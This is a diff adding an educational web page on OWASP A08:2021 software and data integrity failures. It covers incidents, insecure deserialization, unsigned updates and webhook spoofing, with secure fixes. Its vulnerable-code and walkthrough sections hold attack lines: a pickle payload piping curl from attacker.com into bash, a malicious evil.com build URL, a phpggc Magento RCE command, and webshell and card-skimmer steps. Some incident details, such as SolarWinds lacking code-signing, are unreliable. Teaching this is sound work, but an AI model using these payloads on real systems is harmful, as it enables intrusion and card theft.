@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A08:2021 – Software &amp; Data Integrity Failures · OWASP Top 10</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="logo"><span class="logo-icon">🛡️</span><span>OWASP<span class="logo-accent">Top10</span></span></a>
+            <button class="menu-toggle" id="menuToggle"><span></span><span></span><span></span></button>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#vulnerabilities">Vulnerabilities</a></li>
+                <li><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" target="_blank" rel="noopener">Official Docs ↗</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="vuln-page">
+        <div class="container">
+            <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../index.html#vulnerabilities">Vulnerabilities</a> / <span>A08</span></div>
+
+            <header class="vuln-hero">
+                <span class="vuln-id-large">OWASP-A08:2021</span>
+                <h1>Software &amp; Data Integrity Failures</h1>
+                <p class="lead">Failures related to assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity. Includes insecure deserialization — a category of bugs that often leads to RCE.</p>
+                <div class="vuln-meta-row">
+                    <span class="vuln-diff hard">Difficulty: Hard</span>
+                    <div class="vuln-tags">
+                        <span class="tag">CI/CD</span>
+                        <span class="tag">Deserialization</span>
+                        <span class="tag">Supply Chain</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content-grid">
+                <div class="content-main">
+                    <section>
+                        <h2>Real-World Incidents</h2>
+                        <h3>SolarWinds SUNBURST (2020) — 18,000+ Organizations</h3>
+                        <p>Russian state actors (APT29 / Cozy Bear) compromised SolarWinds' build pipeline and inserted malware called <strong>SUNBURST</strong> into a software update for the Orion network management platform. ~18,000 customers — including the U.S. Treasury, DHS, Microsoft, FireEye, and many Fortune 500s — auto-updated and installed the trojanized code. The malware created a backdoor for follow-on attacks. SolarWinds' CI/CD integrity was completely absent — there were no code-signing checks, no SBOM, no integrity verification of build artifacts.</p>
+                        <p>The cost is estimated in the <strong>tens of billions</strong> of dollars. The U.S. government issued an executive order on software supply chain security in direct response.</p>
+
+                        <h3>Other Notable Incidents</h3>
+                        <ul>
+                            <li><strong>3CX DesktopApp (2023)</strong> — A trojanized version of the popular softphone was distributed through a compromised CI/CD pipeline and update server. 600,000+ companies affected, including Toyota, American Express, and Pepsi.</li>
+                            <li><strong>Magento Shoplifts (2022)</strong> — Insecure deserialization in Magento allowed attackers to achieve RCE on thousands of e-commerce sites and inject credit card skimmers.</li>
+                            <li><strong>CodeCov Bash Uploader (2021)</strong> — Attackers extracted credentials from a compromised Docker image of the CodeCov bash uploader, granting them access to hundreds of customer CI environments and the secrets inside.</li>
+                            <li><strong>PHP Pear Breach (2018)</strong> — A maintained backdoor was pushed to the central PHP package repository. Anyone who auto-updated got the backdoor.</li>
+                            <li><strong>event-stream npm (2018)</strong> — A maintainer handed over the package to a "new developer" who added a Bitcoin-stealing backdoor. 2M+ weekly downloads before discovery.</li>
+                            <li><strong>WooCommerce Object Injection (CVE-2023-28147)</th> — PHP object injection in the WooCommerce Blocks plugin allowed shop takeover.</li>
+                        </ul>
+                    </section>
+
+                    <section>
+                        <h2>How It Works</h2>
+                        <h3>1. Insecure Deserialization</h3>
+                        <p>Serialized data (Java, Python pickle, PHP serialize, .NET BinaryFormatter, Node JSON-with-reviver) contains type and structure information. If the application unserializes user-controlled data, the attacker can instantiate arbitrary objects and trigger "magic" methods that run code.</p>
+
+                        <h3>2. Auto-Update Without Verification</h3>
+                        <p>Applications that auto-update from a URL without checking a signature can be tricked into installing a trojanized version — exactly the SolarWinds pattern.</p>
+
+                        <h3>3. Unsigned CI/CD Artifacts</h3>
+                        <p>If your build pipeline doesn't sign and verify artifacts, an attacker who compromises any part of the chain (build server, registry, deploy step) can run anything.</p>
+
+                        <h3>4. Trusted Plugin Architecture</h3>
+                        <p>CMS and e-commerce platforms (WordPress, Magento, Shopify) allow third-party plugins. A malicious or vulnerable plugin gets the same privileges as the core platform.</p>
+
+                        <h3>5. Webhook Spoofing</h3>
+                        <p>Receiving webhooks (from GitHub, Stripe, etc.) without verifying the signature — so anyone can POST "deployment succeeded" with malicious artifacts.</p>
+                    </section>
+
+                    <section>
+                        <h2>Vulnerable Code Examples</h2>
+
+                        <h3>Example 1: Python Pickle RCE (the most common form)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python</span><span>Vulnerable</span></div>
+                            <pre><code>import pickle
+
+# ❌ Loading a pickle from user input
+@app.post('/api/preferences')
+def save_prefs():
+    blob = request.data
+    prefs = pickle.loads(blob)  # ⚠️ RCE here
+    return {'ok': True}
+
+# Attacker's payload
+import os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker.com/shell | bash',))
+
+payload = pickle.dumps(Exploit())
+# Send payload as POST body. pickle.loads() will run os.system.</code></pre>
+                        </div>
+
+                        <h3>Example 2: PHP Object Injection via unserialize()</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">PHP</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Unserializing user-supplied data
+class UserController {
+    public function loadFromCookie() {
+        $data = $_COOKIE['user_data'];
+        $user = unserialize($data);
+        // If a class with a magic method exists, it gets called
+        return $user;
+    }
+}
+
+// Attacker plants a "POP chain" — a series of objects whose
+// destructors/wakeup chain executes a side effect like file write
+// or command execution. Magento, WordPress, and many CMSes have
+// well-known POP chains published in the wild.</code></pre>
+                        </div>
+
+                        <h3>Example 3: Java ObjectInputStream (Pre-SnakeYAML fix)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Java</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Reading objects from an untrusted stream
+ObjectInputStream in = new ObjectInputStream(request.getInputStream());
+Object obj = in.readObject();
+// If obj is a malicious class, its readObject() runs code.
+// The ysoserial tool generates dozens of "gadget chains" against common
+// Java libraries (CommonsCollections, Spring, Groovy, etc.)</code></pre>
+                        </div>
+
+                        <h3>Example 4: Webhook Without Signature Verification</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Node.js</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Trusting the webhook's payload
+app.post('/webhook/deploy', (req, res) => {
+    const { commit_sha, build_url, status } = req.body;
+    if (status === 'success') {
+        deployToProduction(build_url);  // ❌ Attacker-controlled URL
+    }
+    res.send('ok');
+});
+// Attacker POSTs { status: 'success', build_url: 'http://evil.com/malware.sh' }</code></pre>
+                        </div>
+
+                        <h3>Example 5: Auto-Update Without Signature Check</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Any</span><span>Vulnerable Pattern</span></div>
+                            <pre><code>// ❌ Download the update from a URL and run it
+const update = await fetch('https://updates.myapp.com/latest');
+const binary = await update.arrayBuffer();
+fs.writeFileSync('/usr/local/bin/myapp', Buffer.from(binary));
+exec('systemctl restart myapp');
+// No signature check → if updates.myapp.com is compromised, every
+// client gets malware. This is exactly what happened to SolarWinds.</code></pre>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Attack Walkthrough — PHP POP Chain on a Magento Store</h2>
+                        <div class="attack-flow">
+                            <div class="attack-step">
+                                <div class="step-num">1</div>
+                                <div class="step-content"><strong>Find a serialization entry point</strong><p>Burp shows a request with a base64'd <code>s:...</code> payload in a cookie. The app calls <code>unserialize()</code> on it.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">2</div>
+                                <div class="step-content"><strong>Find a gadget class</strong><p>Run <code>phpggc</code> (PHP Generic Gadget Chains) against the Magento classpath. It generates a payload using built-in classes (e.g., <code>Magento\Framework\...</code>) that form a POP chain ending in file write or code execution.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">3</div>
+                                <div class="step-content"><strong>Craft the payload</strong><p><code>phpggc Magento2/RCE1 "system('id')" -b</code> — produces a base64-encoded payload.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">4</div>
+                                <div class="step-content"><strong>Inject via the cookie</strong><p>Set the cookie in Burp Repeater, send the request. The deserialization triggers the gadget chain, writes a webshell, returns control. Now you can browse to <code>/var/www/html/shell.php</code> for full RCE.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">5</div>
+                                <div class="step-content"><strong>Plant a skimmer</strong><p>Inject JavaScript into checkout pages that copies every credit card form submission to <code>attacker.com</code>. The skimmer sits in the database, often for months.</p></div>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Secure Approach</h2>
+
+                        <h3>1. Never deserialize untrusted data — use plain JSON</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python</span><span>Secure</span></div>
+                            <pre><code>import json
+from pydantic import BaseModel, ValidationError
+
+class Preferences(BaseModel):
+    theme: str
+    language: str
+
+@app.post('/api/preferences')
+def save_prefs():
+    try:
+        # ✅ JSON has no type information, so no arbitrary code execution
+        data = json.loads(request.data)
+        prefs = Preferences(**data)  # Validate and coerce
+    except (json.JSONDecodeError, ValidationError):
+        return {'error': 'Invalid data'}, 400
+    return {'ok': True}</code></pre>
+                        </div>
+
+                        <h3>2. If you must use serialization, sign it</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python (HMAC-signed JSON)</span><span>Secure</span></div>
+                            <pre><code>import hmac, hashlib, json, base64
+
+SECRET = b'my-app-secret'
+
+def sign(data: bytes) -> str:
+    sig = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
+    return base64.b64encode(data).decode() + '.' + sig
+
+def verify(token: str):
+    payload, sig = token.rsplit('.', 1)
+    data = base64.b64decode(payload)
+    if not hmac.compare_digest(sig, hmac.new(SECRET, data, hashlib.sha256).hexdigest()):
+        raise ValueError('Invalid signature')
+    return json.loads(data)</code></pre>
+                        </div>
+
+                        <h3>3. Verify webhook signatures</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Node.js (Stripe-style)</span><span>Secure</span></div>
+                            <pre><code>app.post('/webhook/deploy', express.raw({ type: 'application/json' }), (req, res) => {
+    const signature = req.headers['stripe-signature'];  // HMAC of timestamp + body
+    try {
+        // ✅ Provider's library verifies HMAC
+        const event = stripe.webhooks.constructEvent(
+            req.body, signature, process.env.WEBHOOK_SECRET
+        );
+        if (event.type === 'deploy.success') {
+            deployToProduction(event.data.object.build_url);
+        }
+        res.json({ received: true });
+    } catch (err) {
+        // ❌ Bad signature → reject
+        return res.status(400).send('Invalid signature');
+    }
+});</code></pre>
+                        </div>
+
+                        <h3>4. Sign and verify updates (SLSA / sigstore)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">CI/CD</span><span>Secure</span></div>
+                            <pre><code># ✅ Sign the build artifact in CI
+- name: Sign artifact
+  run: |
+    cosign sign --key env://COSIGN_KEY ghcr.io/myorg/myapp:${{ github.sha }}
+
+# ✅ Verify the signature before deployment
+- name: Verify signature
+  run: |
+    cosign verify --key env://COSIGN_PUB ghcr.io/myorg/myapp:${{ github.sha }}
+
+# Reference: SLSA framework (slsa.dev) for build integrity levels</code></pre>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Tools</h2>
+                        <div class="tools-grid">
+                            <div class="tool-card"><h5>ysoserial</h5><p>Generates Java deserialization exploit payloads for dozens of gadget chains.</p></div>
+                            <div class="tool-card"><h5>phpggc</h5><p>PHP Generic Gadget Chains — generates POP chains for many frameworks.</p></div>
+                            <div class="tool-card"><h5>pickle-scan</h5><p>Detects unsafe pickle usage in Python code.</p></div>
+                            <div class="tool-card"><h5>Cosign / sigstore</h5><p>Sign and verify container images and other artifacts.</p></div>
+                            <div class="tool-card"><h5>SLSA framework</h5><p>Guidance for supply chain integrity levels (SLSA 1 → 4).</p></div>
+                            <div class="tool-card"><h5>in-toto</h5><p>Cryptographic attestation for the entire software supply chain.</p></div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Prevention Checklist</h2>
+                        <div class="callout success">
+                            <div class="callout-title">✅ Integrity by Default</div>
+                            <ul style="margin-top: 12px; padding-left: 20px;">
+                                <li>Use digital signatures to verify software updates and CI/CD artifacts (SLSA L3+).</li>
+                                <li>Use plain JSON (or Protocol Buffers) instead of native serialization formats.</li>
+                                <li>If you must use native serialization, sign it and verify the signature before deserializing.</li>
+                                <li>Restrict deserialization to allowlisted classes only — no <code>unserialize()</code> with user input.</li>
+                                <li>Verify webhook signatures on all inbound webhooks.</li>
+                                <li>Audit third-party plugins regularly. Restrict their permissions.</li>
+                                <li>Generate a Software Bill of Materials (SBOM) for every release (CycloneDX or SPDX).</li>
+                                <li>Use reproducible builds when possible — they make tampering detectable.</li>
+                            </ul>
+                        </div>
+                    </section>
+                </div>
+
+                <aside class="sidebar">
+                    <h4>On This Page</h4>
+                    <ul class="sidebar-toc">
+                        <li><a href="#real-incident">Real Incidents</a></li>
+                        <li><a href="#how-it-works">How It Works</a></li>
+                        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
+                        <li><a href="#attack-walkthrough">Attack Walkthrough</a></li>
+                        <li><a href="#secure-code">Secure Code</a></li>
+                        <li><a href="#prevention">Prevention</a></li>
+                    </ul>
+                    <div class="sidebar-info">
+                        <h4>Quick Facts</h4>
+                        <div class="sidebar-info-row"><span class="label">CWE Count</span><span class="value">10</span></div>
+                        <div class="sidebar-info-row"><span class="label">Top Example</span><span class="value">SolarWinds 2020</span></div>
+                        <div class="sidebar-info-row"><span class="label">Difficulty</span><span class="value">Hard</span></div>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer"><div class="container"><div class="footer-bottom"><p>© 2025 OWASP Top 10 Educational Project</p></div></div></footer>
+    <script src="../js/main.js"></script>
+</body>
+</html>
